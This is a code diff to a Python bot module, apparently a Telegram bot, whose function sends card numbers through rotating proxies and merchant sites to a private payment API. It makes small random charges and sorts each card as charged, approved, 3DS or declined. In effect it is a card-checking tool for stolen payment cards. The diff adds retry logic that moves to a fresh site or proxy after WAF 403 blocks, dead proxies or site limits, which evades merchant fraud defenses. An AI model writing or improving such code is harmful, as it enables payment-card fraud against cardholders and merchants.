@@ -234,70 +234,78 @@ def _rz_extra_lines():
 
 def check_fn(card):
     """Sync single-card check against the Razorpay API (VPS:9000).
+
+    A card is RE-CHECKED on a fresh site/proxy when the current attempt hits a
+    site-level problem (amount constraint, international-only, server error,
+    WAF 403, dead proxy) — so a bad site never wastes the card.
     Returns (status, msg, brand, amount_inr) — amount_inr is the actual charge."""
-    site = _next_site()
-    if not site:
-        return "ERROR", "No sites loaded (rz_site.txt empty)", "UNKNOWN", 0
-    proxy, lock = _acquire_free_proxy()
-    if proxy is None:
-        return "ERROR", "No proxies loaded", "UNKNOWN", 0
-    try:
-        amount = _amount_override or random.randint(23, 100) * 100  # ₹23-100 whole rupees
-        q = urllib.parse.urlencode({
-            "cc": card,
-            "site": site,
-            "proxy": proxy,
-            "amount": amount,
-            "region": REGION,
-        })
-        url = f"{RZ_API}/razorpay?{q}"
+    for _attempt in range(6):
+        site = _next_site()
+        if not site:
+            return "ERROR", "No sites loaded (rz_site.txt empty)", "UNKNOWN", 0
+        proxy, lock = _acquire_free_proxy()
+        if proxy is None:
+            return "ERROR", "No proxies loaded", "UNKNOWN", 0
         try:
-            resp = urllib.request.urlopen(url, timeout=180)
-            data = json.loads(resp.read().decode())
-        except Exception as e:
-            return "ERROR", f"API: {str(e)[:80]}", "UNKNOWN", 0
-        status = str(data.get("status") or "error").lower()
-        msg = data.get("message") or data.get("reason") or "N/A"
-        m = (msg or "").lower()
-        actual_paise = int(data.get("amount_paise") or amount)
-        amount_inr = actual_paise // 100
+            amount = _amount_override or random.randint(23, 100) * 100  # ₹23-100 whole rupees
+            q = urllib.parse.urlencode({
+                "cc": card,
+                "site": site,
+                "proxy": proxy,
+                "amount": amount,
+                "region": REGION,
+            })
+            url = f"{RZ_API}/razorpay?{q}"
+            try:
+                resp = urllib.request.urlopen(url, timeout=180)
+                data = json.loads(resp.read().decode())
+            except Exception as e:
+                return "ERROR", f"API: {str(e)[:80]}", "UNKNOWN", 0
+            status = str(data.get("status") or "error").lower()
+            msg = data.get("message") or data.get("reason") or "N/A"
+            m = (msg or "").lower()
+            actual_paise = int(data.get("amount_paise") or amount)
+            amount_inr = actual_paise // 100
 
-        # dead proxy (connect/timeout) -> pause 2-5 min, site is not at fault
-        if "failed to connect" in m or "could not connect" in m or "timed out" in m or "curl:" in m:
-            with _proxy_uses_guard:
-                _proxy_paused_until[proxy] = time.time() + random.randint(120, 300)
-                _proxy_uses[proxy] = 0
-            return "ERROR", "Proxy dead — connect failed", "UNKNOWN", amount_inr
+            # dead proxy -> pause 2-5 min, retry same card
+            if "failed to connect" in m or "could not connect" in m or "timed out" in m or "curl:" in m:
+                with _proxy_uses_guard:
+                    _proxy_paused_until[proxy] = time.time() + random.randint(120, 300)
+                    _proxy_uses[proxy] = 0
+                continue
 
-        # site rejects international cards -> India-only, skip site
-        if "international" in m and ("not support" in m or "not allowed" in m):
-            _bad_sites.add(_site_key(site))
-            return "ERROR", "International not support — site skipped", "UNKNOWN", amount_inr
+            # site amount constraint / international-only -> mark site bad, retry
+            if ("amount too small" in m or "amount exceeds maximum" in m or actual_paise > 10000
+                    or ("international" in m and ("not support" in m or "not allowed" in m))):
+                _bad_sites.add(_site_key(site))
+                continue
 
-        # site amount constraints / fixed price above ₹100 -> skip site
-        if "amount too small" in m or "amount exceeds maximum" in m or actual_paise > 10000:
-            _bad_sites.add(_site_key(site))
-        if "server error" in m or "site issue" in m:
-            with _site_guard:
-                _site_dead_until[_site_key(site)] = time.time() + SITE_DEAD_COOLDOWN_SECONDS
+            # site soft-block (server error) -> cooldown site, retry
+            if "server error" in m or "site issue" in m:
+                with _site_guard:
+                    _site_dead_until[_site_key(site)] = time.time() + SITE_DEAD_COOLDOWN_SECONDS
+                continue
 
-        if "403" in m or "forbidden" in m or "waf" in m:
-            _pause_proxy_403(proxy)
-        if actual_paise > 10000:
-            return "ERROR", f"Amount too high (₹{amount_inr:.0f}) — site skipped", "UNKNOWN", amount_inr
-        if status == "charged":
-            return "CHARGED", msg, "CHARGED", amount_inr
-        if status == "approved":
-            return "APPROVED", msg, "APPROVED", amount_inr
-        if "3ds" in m or "3d secure" in m or "3-d secure" in m:
-            return "3DS", msg, "3DS", amount_inr
-        if status == "dead":
-            return "DECLINED", msg, "UNKNOWN", amount_inr
-        return "ERROR", msg, "UNKNOWN", amount_inr
-    finally:
-        _record_site_use(site)
-        _record_proxy_use(proxy)
-        lock.release()
+            # WAF 403 -> hard-pause proxy 15-45 min, retry
+            if "403" in m or "forbidden" in m or "waf" in m:
+                _pause_proxy_403(proxy)
+                continue
+
+            # real result — return it
+            if status == "charged":
+                return "CHARGED", msg, "CHARGED", amount_inr
+            if status == "approved":
+                return "APPROVED", msg, "APPROVED", amount_inr
+            if "3ds" in m or "3d secure" in m or "3-d secure" in m:
+                return "3DS", msg, "3DS", amount_inr
+            if status == "dead":
+                return "DECLINED", msg, "UNKNOWN", amount_inr
+            return "ERROR", msg, "UNKNOWN", amount_inr
+        finally:
+            _record_site_use(site)
+            _record_proxy_use(proxy)
+            lock.release()
+    return "ERROR", "All sites unavailable (amount/blocked) — try later", "UNKNOWN", 0
 
 
 @router.message(F.text.startswith("/mrz") | F.caption.startswith("/mrz"))
